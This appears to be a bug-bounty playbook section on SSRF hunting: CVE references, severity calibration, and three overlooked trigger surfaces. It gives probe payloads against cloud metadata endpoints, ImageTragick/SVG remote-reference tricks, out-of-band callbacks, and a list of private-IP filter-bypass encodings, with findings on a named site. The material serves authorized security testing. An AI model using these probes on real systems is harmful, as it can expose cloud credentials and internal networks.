- **`hunt-cloud-misconfig`** — Internal-only buckets/APIs become reachable through SSRF egress. Chain primitive: SSRF + DNS rebinding → SSRF-protected-endpoint bypass → internal /admin or private S3 bucket read.
- **`security-arsenal`** — Load the SSRF IP Bypass Table (11 techniques: decimal IP, IPv6 mapped, octal, suffix dot, DNS rebinding, redirect chain, etc.) before testing filters.
- **`triage-validation`** — Apply the OOB-Or-It-Didn't-Happen gate: every blind SSRF claim requires a Burp Collaborator hit with a unique marker before report submission.


## 2026 sweep (dork pass 2026-10-18 — 4 repo)

- **CVE-2026-15409 — SonicWall SMA1000 unauth SSRF → Erlang RCE → root privesc** (`tc4dy/CVE-2026-15409-15410-Framework` ★6)
  - CVE-2026-15409** is a critical **unauthenticated Server-Side Request Forgery (SSRF)** vulnerability discovered in the SonicWall SMA1000 Appliance Work Place interface.
- **CVE-2026-62201 — OpenClaw sandbox exec-server network-policy bypass (SSRF)** (`diedromeo/CVE-2026-62201-OpenClaw-SSRF` ★0)
  - CVE-2026-62201 — OpenClaw Sandbox Exec-Server Network Policy Bypass (SSRF)
  - Ability to reach the exec-server HTTP endpoint and invoke `http/request` (the platform treats this as *low-privilege* access — e.g. a plugin, a tool, or an input path, not a g
- **CVE-2026-33712 — Typebot ≤3.15.2 unauthenticated SSRF (fixed 3.16.0)** (`portbuster1337/CVE-2026-33712` ★0)
  - Typebot <= 3.15.2** (fixed in 3.16.0) contains an unauthenticated Server-Side Request
- **CVE-2026-46726 — Apache Camel camel-http producer SSRF (CWE-918)** (`oscerd/CVE-2026-46726` ★0)
  - Both are **affected** versions (fixed in 4.14.8 / 4.18.3 / 4.21.0), and both demonstrate the identical defect:
  - downstream camel-http producer wherever it likes (SSRF, CWE-918). Because the producer also resolves Camel


## 2026 sweep 3 (dork pass 2026-10-18 — web2, 1 repo)

- CVE-2026-26898 — unauthenticated SSRF in Xiaomi Mi Router 4A (firmware 3.0.2x) via host-header injection; the SSRF enables internal-network scanning of services that trust the router, and chains to RCE.
  - authentication**, and the SSRF enables internal-network scanning and access to services that trust
  - Attack Chain**: Can be combined with other vulnerabilities for RCE


## Critical severity anchor (kelas ini bisa Critical — syaratnya)

Full-read (upstream body di respons) = severity substansial lebih tinggi; cloud metadata `169.254.169.254` → kredensial → account/data; internal admin panel → RCE; headless browser (Puppeteer) = nilai sangat tinggi. Kalibrasi: kalau jawabannya hanya 'server fetch URL saya', severity rendah — kuantifikasi blast radius yang benar-benar terjangkau.


## Trigger surfaces — two that get missed (added 2026-10-30)

The usual SSRF list is "import from URL / webhook / PDF renderer / metadata". Two surfaces are
routinely skipped and both pay:

### S-A. Health check / monitoring / status endpoint
Endpoints built to check *other* things make server-side requests by design:
`/health?url=`, `/status?target=`, `/monitor/ping?host=`, `/api/healthcheck`, `/debug/vars`,
Prometheus `/metrics` scrapers, uptime probes, "test connection" buttons in admin panels.
- Probe: `?url=http://<interactsh>/x`, then `?url=http://127.0.0.1:22`, then
  `?url=http://169.254.169.254/latest/meta-data/`.
- Proof: the endpoint itself fetches. A status code is NOT proof — capture the body.
- Extra value: these often leak internal topology (service names, ports, versions) even when the
  fetch is blind, which is a pivot into further SSRF or into internal-only hosts.

### S-B. Image / document library that resolves remote references (ImageTragick class)
Any server-side image or document processing step that follows URLs embedded in the uploaded file:
- ImageMagick / GraphicsMagick via `convert`, `identify`, `mogrify` — the ImageTragick family:
  `push graphic-context` / `url(https://...)` / `fill 'url(...)'` / MVG, and SVG with
  `<image xlink:href="http://169.254.169.254/...">` or external entities.
- Ghostscript (PDF/PS), LibreOffice/`unoconv` (ODT/DOCX with external links), wkhtmltopdf,
  headless Chrome print-to-PDF (iframe/img/`@import`), ExifTool (some formats fetch).
- Probe: upload an SVG/MVG/HTML that references `http://<interactsh>/probe.png`; then swap to
  `http://127.0.0.1:PORT/` and to the metadata IP.
- Proof: callback received at the moment of processing, not at upload. Re-render triggers it again.
- Version matters: check `convert -version` output leaked anywhere, or banner; old builds are
  trivially exploitable, patched ones need the SVG/`@` variants.

Both belong in the same evidence standard as any SSRF: a DNS callback alone is Informational —
push to metadata read (rung 3) or credential use (rung 4) before reporting.

### S-C. SSO / IdP configuration import from a URL (added 2026-10-31)

Every "connect your identity provider" flow has an import box: paste your IdP's **metadata URL**
and the server fetches it. That is a server-side fetch with a caller-supplied destination, and it
is routinely missed because the field is labelled `metadataUrl`, not `url`.

- Where: `POST /api/saml/import-metadata {teamCode, metadataUrl}`,
  `POST /api/oidc/import-metadata {teamCode, metadataUrl}` — found on Scribble Maps
  (2026-10-31, authenticated team owner). Same shape exists on Okta/Entra/Google-Workspace
  onboarding flows generally; grep the SPA bundle for `import-metadata`, `metadataUrl`,
  `discovery`, `.well-known/openid-configuration`.
- **Impact is higher than a plain fetcher** when the import succeeds: the fetched document becomes
  the team's *trusted identity provider* (entityId, ssoUrl, certificate). A team owner who imports
  from an attacker-controlled URL hands the attacker control of that team's SSO. Say this in the
  report — it is what lifts the finding above "server fetches my URL".
- **Probe whether the fetch carries credentials** (cheap, decisive, and usually skipped): point
  `metadataUrl` at an **auth-required endpoint on the target's own domain** and read the error.
  A 401 to the server-side fetch proves no cookie/session forwarding, so the ceiling is network
  position, not identity. Measured on Scribble Maps: `/api/account`, `/api/vulnerability/list` and
  `team./api/users` all returned 401 to the fetch, while public `/health` and `/robots.txt`
  returned 200 — no credential replay.
- **Error-string matrix doubles as the reachability oracle** when the body is parsed, not returned:
  `"Failed to parse metadata XML"` = fetched, HTTP 200; `"Could not fetch the metadata"` =
  connection failed / non-200 / blocked. Diff those two strings against each candidate host.
- **Run the full private-range battery before claiming internal reach** — this target blocked every
  variant after DNS resolution: `127.0.0.1`, `[::1]`, `[::ffff:127.0.0.1]`, `[::ffff:a9fe:a9fe]`,
  `2130706433`, `0x7f000001`, `017700000001`, `127.1`, `0.0.0.0`, `169.254.169.254`, `10.0.0.1`,
  `192.168.0.1`, `localtest.me`, `127.0.0.1.nip.io`, `10.0.0.1.nip.io`, `192.168.0.1.nip.io`.
  Also expect HTTPS-only enforcement (`http://` rejected by scheme check), no redirect following,
  and size/time caps (5 s / 512 KB here).
- **Rate it honestly.** Public-only SSRF with those controls in place is Low-Medium, not High.
  Report the bypasses you actually landed and keep internal reach in the not-demonstrated bucket;
  the one thing worth naming as a *residual* risk is the DNS-rebinding TOCTOU between the
  resolve-check and the fetch, since the filter is a single check on the resolved address.
